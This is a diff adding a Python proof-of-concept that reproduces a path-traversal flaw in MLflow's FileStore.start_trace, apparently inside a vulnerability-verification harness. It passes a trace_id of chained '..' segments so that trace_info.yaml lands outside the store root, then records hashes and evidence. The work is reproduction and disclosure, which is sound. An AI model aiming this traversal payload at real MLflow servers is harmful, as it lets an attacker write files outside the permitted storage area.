@@ -1,0 +1,92 @@
+"""CVE-2026-53995 dynamic reproduction (MLflow 3.17.1 FileStore).
+
+``FileStore.start_trace`` joins the caller-supplied ``trace_id`` into the
+tracking root without normalization, then writes ``trace_info.yaml`` below it.
+A trace id containing ``..`` escapes the experiment's trace directory.
+
+This is a direct FileStore (server-side storage layer) reproduction.  The
+resulting YAML file outside the store root is the proof; no MLflow server or
+database is required.
+"""
+
+from __future__ import annotations
+
+import json
+import os
+import shutil
+import sys
+import time
+from pathlib import Path
+
+sys.path.insert(0, str(Path(__file__).resolve().parents[1]))
+import poclib  # noqa: E402
+
+os.environ["MLFLOW_ALLOW_FILE_STORE"] = "true"
+
+
+def main() -> None:
+    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
+    from mlflow.entities import TraceInfo, TraceLocation, TraceState
+    from mlflow.store.tracking.file_store import FileStore
+
+    text = poclib.MARKER_TEXT
+    poclib.start_marker("ABSENT")
+    root = poclib.EVIDENCE_DIR / "mlflow-store"
+    if root.exists():
+        shutil.rmtree(root)
+    root.mkdir(parents=True)
+
+    store = FileStore(str(root))
+    experiment = store.create_experiment(
+        "verify", artifact_location=(root / "artifacts").as_uri()
+    )
+    # traces/<id> is three levels below <evidence>; 3x ".." lands in evidence/.
+    target_name = "traversal-target"
+    trace_id = f"..\\..\\..\\{target_name}"
+    target = poclib.EVIDENCE_DIR / target_name
+    if target.exists():
+        shutil.rmtree(target)
+
+    trace = TraceInfo(
+        trace_id=trace_id,
+        trace_location=TraceLocation.from_experiment_id(experiment),
+        request_time=int(time.time() * 1000),
+        state=TraceState.OK,
+        request_preview=text,
+    )
+    store.start_trace(trace)
+    info = target / "trace_info.yaml"
+    content = poclib.read_text(info)
+
+    if not info.is_file() or text not in content:
+        poclib.fail("trace_id traversal did not write outside the store root", target=str(target))
+
+    poclib.prove_marker(text)
+    poclib.finish_verified(
+        {
+            "transport": {
+                "type": "function+filesystem",
+                "entrypoint": "mlflow.store.tracking.file_store.FileStore.start_trace",
+                "store_root": poclib.rel(root),
+                "experiment_id": experiment,
+                "trace_id": trace_id,
+                "escaped_path": poclib.rel(info),
+                "escaped_sha256": poclib.sha256_file(info),
+                "content_excerpt": content[:600],
+                "package": manifest.get("version_ref", {}).get("package"),
+                "version": manifest.get("version"),
+            },
+            "request_response": [
+                {
+                    "input": {"trace_id": trace_id, "request_preview": text},
+                    "result": "trace_info.yaml created outside store root",
+                }
+            ],
+            "state_before": "target absent",
+            "state_after": "target/trace_info.yaml exists with proof text",
+        }
+    )
+
+
+if __name__ == "__main__":
+    main()
